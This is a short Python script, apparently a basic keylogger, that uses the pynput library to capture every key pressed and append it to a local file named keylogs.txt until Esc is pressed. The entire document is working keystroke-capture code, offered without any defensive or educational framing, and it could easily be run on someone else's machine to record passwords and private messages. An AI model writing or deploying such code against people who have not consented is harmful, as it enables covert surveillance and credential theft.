from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write('{0} '.format(key.char))
    except AttributeError:
        if key == Key.space:
            with open("keylogs.txt", "a") as f:
                f.write(' ')
        else:
            with open("keylogs.txt", "a") as f:
                f.write(' {0} '.format(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
